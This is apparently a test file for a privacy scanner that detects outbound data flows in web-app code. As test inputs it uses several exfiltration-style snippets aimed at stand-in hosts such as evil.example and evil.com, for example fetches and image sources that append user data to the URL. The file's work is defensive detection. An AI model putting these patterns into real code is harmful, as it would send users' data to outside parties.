// ===========================================================================
// The privacy audit's deterministic scan (src/scan/detectEgress.js): where an
// app's code can send things, rule by rule.
// ===========================================================================
import { test } from 'node:test';
import assert from 'node:assert/strict';

import { detectEgress, EGRESS_RULES, EGRESS_RULES_VERSION } from '../../src/scan/detectEgress.js';

const SITE = 'https://notes-ws1.valuguru.app';
const scan = (text, path = 'src/app.ts', extra = {}) =>
  detectEgress({ source: [{ path, text }], ...extra }, { siteOrigin: SITE });
const built = (text, path = 'dist/assets/index-abc.js') =>
  detectEgress({ built: [{ path, text }] }, { siteOrigin: SITE });
const rules = (result) => result.findings.map((f) => `${f.rule}:${f.result}`);
const one = (result) => {
  assert.equal(result.findings.length, 1, JSON.stringify(result.findings));
  return result.findings[0];
};

test('a literal outside fetch fails, with its host and line', () => {
  const f = one(scan("const a = 1;\nawait fetch('https://evil.example/c?d=' + x);"));
  assert.equal(f.rule, 'egress.external-url');
  assert.equal(f.result, 'fail');
  assert.equal(f.host, 'evil.example');
  assert.equal(f.line, 2);
  assert.match(f.snippet, /fetch\('https:\/\/evil\.example/);
});

test('a fetch to the site itself or to Valu is fine', () => {
  assert.deepEqual(scan("fetch('/api/x'); fetch('https://api.valuguru.app/x');").findings, []);
  assert.deepEqual(scan(`fetch('${SITE}/data.json')`).findings, []);
});

test("an origin the caller vouches for (the project's database) is inside", () => {
  const result = detectEgress(
    { source: [{ path: 'src/db.ts', text: "fetch('https://abc.supabase.co/rest/v1/notes')" }] },
    { siteOrigin: SITE, extraOrigins: ['https://abc.supabase.co'] },
  );
  assert.deepEqual(result.findings, []);
});

test('a fetch to a variable is a concern', () => {
  assert.deepEqual(rules(scan('await fetch(url, { method: "POST" });')), ['egress.dynamic:concern']);
});

test('eval and new Function are concerns', () => {
  assert.deepEqual(rules(scan('eval(code)')), ['egress.dynamic:concern']);
  assert.deepEqual(rules(scan('const f = new Function("a", body);')), ['egress.dynamic:concern']);
});

test('XHR, WebSocket, EventSource, beacons, import() and .src', () => {
  assert.deepEqual(rules(scan("xhr.open('POST', 'https://x.io/collect')")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("new WebSocket('wss://x.io/s')")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("new EventSource('https://x.io/e')")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("navigator.sendBeacon('https://x.io/b', data)")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("await import('https://cdn.x.io/m.js')")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("img.src = 'https://x.io/pixel.gif'")), ['egress.external-url:fail']);
});

test('a third-party script in HTML fails', () => {
  const f = one(scan('<script src="https://cdn.x/y.js"></script>', 'index.html'));
  assert.equal(f.rule, 'egress.third-party-script');
  assert.equal(f.host, 'cdn.x');
});

test('a stylesheet, a prefetch and an outside image in HTML', () => {
  assert.deepEqual(rules(scan('<link rel="stylesheet" href="https://fonts.x/a.css">', 'index.html')), [
    'egress.third-party-script:fail',
  ]);
  assert.deepEqual(rules(scan('<link rel="preconnect" href="https://fonts.x">', 'index.html')), ['egress.prefetch:fail']);
  assert.deepEqual(rules(scan('<img src="https://x.io/a.png">', 'index.html')), ['egress.external-url:fail']);
  assert.deepEqual(scan('<link rel="icon" href="/favicon.svg">', 'index.html').findings, []);
});

test('navigation that carries data fails; a plain outside link is info', () => {
  assert.deepEqual(rules(scan("location.href = 'https://x.io/?u=' + email;")), ['egress.navigation:fail']);
  assert.deepEqual(rules(scan('window.open(`https://x.io/share?t=${text}`)')), ['egress.navigation:fail']);
  assert.deepEqual(rules(scan('<a href="https://docs.x.io">Docs</a>', 'src/App.tsx')), ['egress.navigation:info']);
  assert.deepEqual(rules(scan('<form action="https://x.io/f" method="post">', 'index.html')), ['egress.navigation:fail']);
  assert.deepEqual(rules(scan('location.href = next;')), ['egress.dynamic:concern']);
});

test('WebRTC fails; a service worker is a concern', () => {
  assert.deepEqual(rules(scan('const pc = new RTCPeerConnection(cfg);')), ['egress.webrtc:fail']);
  assert.deepEqual(rules(scan("navigator.serviceWorker.register('/sw.js')")), ['egress.worker:concern']);
});

test("Valu's onward channels fail: Http, the AI proxy, another app's API", () => {
  assert.deepEqual(rules(scan('await valu.Http.post({ url, body });')), ['valu.onward:fail']);
  const proxy = scan('await fetch(`${import.meta.env.VITE_VALU_API}/proxy/openai/v1/chat/completions`, opts)');
  assert.deepEqual(rules(proxy), ['valu.onward:fail']);
  assert.match(proxy.findings[0].detail, /openai/);
  assert.deepEqual(rules(scan("fetch('https://valuguru.texpo.io/api/apps/v1/weather/today')")), ['valu.onward:fail']);
});

test('the project gateway and database through an env variable are a run-time address, not a fail', () => {
  const result = scan('fetch(`${import.meta.env.VITE_SUPABASE_URL}/rest/v1/notes`)');
  assert.deepEqual(rules(result), ['egress.dynamic:concern']);
});

test('an edge function calling outside is server.egress; projectDb is fine', () => {
  const path = 'supabase/functions/notify/index.ts';
  assert.deepEqual(rules(scan("await fetch('https://hooks.x.io/a', { body })", path)), ['server.egress:fail']);
  assert.deepEqual(scan('const r = await projectDb("notes?select=*");', path).findings, []);
  assert.deepEqual(rules(scan("await callValuApp('weather', '/today', {})", path)), ['valu.onward:fail']);
});

test('telemetry packages fail from package.json and from the lockfile', () => {
  const pkg = JSON.stringify({ dependencies: { react: '18', 'posthog-js': '1' }, devDependencies: { '@sentry/vite-plugin': '1' } });
  const result = detectEgress({ packageJson: pkg });
  assert.deepEqual(result.findings.map((f) => f.detail).sort(), [
    'Includes @sentry/vite-plugin, a package that sends usage data',
    'Includes posthog-js, a package that sends usage data',
  ]);
  assert.deepEqual(result.inventory.deps, ['react', 'posthog-js']);
  const lock = JSON.stringify({ packages: { '': {}, 'node_modules/some-lib/node_modules/mixpanel-browser': {} } });
  assert.deepEqual(rules(detectEgress({ lockfile: lock })), ['deps.telemetry:fail']);
});

test('storage, sends to other people and tables are listed, never failed', () => {
  const result = scan(
    "localStorage.setItem('k', v);\nawait valu.TextChat.sendMessage({ text });\nawait valu.ApplicationStorage.set({});",
    'src/app.ts',
    { migrations: [{ path: 'db/migrations/001.sql', text: 'create table if not exists notes (id int);\nCREATE TABLE "tags" (x int);' }] },
  );
  assert.deepEqual(result.findings, []);
  assert.equal(result.inventory.storage[0].detail, 'Keeps data on the device: localStorage');
  assert.equal(result.inventory.sends.length, 1);
  assert.match(result.inventory.sends[0].detail, /textchat:write/);
  assert.deepEqual(result.inventory.tables, ['notes', 'tags']);
});

test('comments are not code', () => {
  assert.deepEqual(scan("// fetch('https://evil.example/x')\n/* new RTCPeerConnection() */").findings, []);
});

test('built bundles: literal calls only, never a URL in a string or fetch(e)', () => {
  assert.deepEqual(built('throw Error("see https://reactjs.org/docs/error-decoder.html?invariant="+e);fetch(e)').findings, []);
  assert.deepEqual(rules(built('fetch("https://evil.example/x",{body:t})')), ['egress.external-url:fail']);
  assert.deepEqual(rules(built('<script src="https://cdn.x/y.js"></script>', 'dist/index.html')), ['egress.third-party-script:fail']);
  assert.deepEqual(rules(built('@import url("https://fonts.x/css");', 'dist/assets/a.css')), ['egress.external-url:fail']);
});

test('a finding seen twice is reported once', () => {
  assert.equal(scan("fetch('https://x.io/a'); fetch('https://x.io/a');").findings.length, 1);
});

test('the rule list and version', () => {
  assert.equal(EGRESS_RULES_VERSION, '1');
  assert.ok(EGRESS_RULES.length >= 10);
  for (const rule of EGRESS_RULES) assert.ok(['fail', 'concern', 'info'].includes(rule.result), rule.id);
});

// --- the misses a review found (2026-10-29) ---------------------------------

test('HTTP libraries with a literal outside address fail', () => {
  assert.deepEqual(rules(scan('axios.post("https://evil.com/c", d)')), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("const r = await ky('https://evil.com/x').json()")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan('$.getJSON("https://evil.com/x", cb)')), ['egress.external-url:fail']);
  assert.deepEqual(scan('$("#menu").hide()').findings, []);
});

test('XHR with any method, and with an address in a variable', () => {
  assert.deepEqual(rules(scan('x.open(method, "https://evil.com")')), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan('x.open("POST", endpoint)')), ['egress.dynamic:concern']);
});

test('setAttribute src / href / action', () => {
  assert.deepEqual(rules(scan("img.setAttribute('src','https://evil.com/p?d='+d)")), ['egress.external-url:fail']);
  assert.deepEqual(rules(scan("a.setAttribute('href', 'https://x.io/?u=' + email)")), ['egress.navigation:fail']);
  assert.deepEqual(rules(scan("f.setAttribute('action', 'https://x.io/f')")), ['egress.navigation:fail']);
});

test('an unquoted script src, a concatenated href, and a static import from a URL', () => {
  assert.deepEqual(rules(scan('<script src=https://evil.com/a.js></script>', 'index.html')), ['egress.third-party-script:fail']);
  assert.deepEqual(rules(scan('<a href={"https://evil.com/?d=" + data}>x</a>', 'src/A.tsx')), ['egress.navigation:fail']);
  assert.deepEqual(rules(scan('import x from "https://cdn.evil.com/m.js";')), ['egress.external-url:fail']);
});

test('any other outside address in the source is a concern the reviewer must explain', () => {
  const aliased = scan('const f = window.fetch;\nf("https://evil.com/x");');
  assert.deepEqual(rules(aliased), ['egress.url-literal:concern']);
  assert.equal(aliased.findings[0].line, 2);
  assert.deepEqual(rules(scan('$.ajax({ url: "https://evil.com", data })')), ['egress.url-literal:concern']);
  assert.deepEqual(scan('const NS = "http://www.w3.org/2000/svg";').findings, []);
  assert.deepEqual(scan("const API = 'https://api.valuguru.app/x';").findings, []);
  // already reported on the line by a stronger rule: not twice
  assert.deepEqual(rules(scan("fetch('https://evil.com/a')")), ['egress.external-url:fail']);
});

test('telemetry in yarn.lock and pnpm-lock.yaml', () => {
  assert.deepEqual(rules(detectEgress({ lockfile: '"posthog-js@^1.0.0":\n  version "1.2.3"\n' })), ['deps.telemetry:fail']);
  assert.deepEqual(rules(detectEgress({ lockfile: "packages:\n  /@sentry/browser@7.1.0:\n    resolution: {}\n" })), ['deps.telemetry:fail']);
  assert.deepEqual(detectEgress({ lockfile: '"react@^18":\n  version "18.3.1"\n' }).findings, []);
});
